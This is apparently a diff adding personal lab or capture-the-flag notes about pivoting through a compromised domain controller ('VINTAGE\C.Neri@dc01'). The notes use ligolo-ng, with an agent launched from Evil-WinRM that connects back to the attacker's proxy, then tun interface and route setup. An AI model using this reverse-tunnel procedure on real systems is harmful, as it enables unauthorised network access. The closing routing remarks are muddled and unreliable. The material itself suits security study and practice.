@@ -1,0 +1,92 @@
+
+
+└─# ligolo-proxy -selfcert               
+INFO[0000] Loading configuration file ligolo-ng.yaml    
+WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
+INFO[0000] Listening on 0.0.0.0:11601                   
+    __    _             __                       
+   / /   (_)___ _____  / /___        ____  ____ _
+  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
+ / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
+/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
+        /____/                          /____/   
+
+  Made in France ♥            by @Nicocha30!
+  Version: dev
+
+ligolo-ng » INFO[1024] Agent joined.                                 id=005056b087fe name="VINTAGE\\C.Neri@dc01" remote="10.10.11.45:56988"
+
+
+
+
+*Evil-WinRM* PS C:\Users\C.Neri\Documents> .\agent.exe -connect 10.10.14.12:11601 -retry -ignore-cert
+agent.exe : time="2025-10-16T15:01:14+02:00" level=warning msg="warning, certificate validation disabled"
+    + CategoryInfo          : NotSpecified: (time="2025-10-1...ation disabled":String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+time="2025-10-16T15:01:14+02:00" level=info msg="Connection established" addr="10.10.14.12:11601"
+
+
+
+ligolo-ng » session
+? Specify a session : 1 - VINTAGE\C.Neri@dc01 - 10.10.11.45:56988 - 005056b087fe
+[Agent : VINTAGE\C.Neri@dc01] » ifconfig
+┌───────────────────────────────────────────────┐
+│ Interface 0                                   │
+├──────────────┬────────────────────────────────┤
+│ Name         │ Ethernet0 2                    │
+│ Hardware MAC │ 00:50:56:b0:87:fe              │
+│ MTU          │ 1500                           │
+│ Flags        │ up|broadcast|multicast|running │
+│ IPv4 Address │ 10.10.11.45/23                 │
+└──────────────┴────────────────────────────────┘
+┌──────────────────────────────────────────────┐
+│ Interface 1                                  │
+├──────────────┬───────────────────────────────┤
+│ Name         │ Loopback Pseudo-Interface 1   │
+│ Hardware MAC │                               │
+│ MTU          │ -1                            │
+│ Flags        │ up|loopback|multicast|running │
+│ IPv6 Address │ ::1/128                       │
+│ IPv4 Address │ 127.0.0.1/8                   │
+└──────────────┴───────────────────────────────┘
+[Agent : VINTAGE\C.Neri@dc01] »
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# ip tuntap add user root mode tun ligolo 
+                                                                                                                    
+┌──(root㉿kali)-[/home/kali]
+└─# ip link set ligolo up                  
+                                                                                                                    
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+
+
+[Agent : VINTAGE\C.Neri@dc01] » start
+INFO[1450] Starting tunnel to VINTAGE\C.Neri@dc01 (005056b087fe) 
+[Agent : VINTAGE\C.Neri@dc01] »  
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# ip route add 10.10.11.45/23 dev ligolo
+
+
+
+In this case, we are using .45/24 but that does/cannot work.
+
+prefix must be valid for given prefix length.
+
+We will likely use something like 
+
+10.10.1.0/24 
+
+and likewise see that in our ligolo ifconfig
+
+
+
+
+
+
+
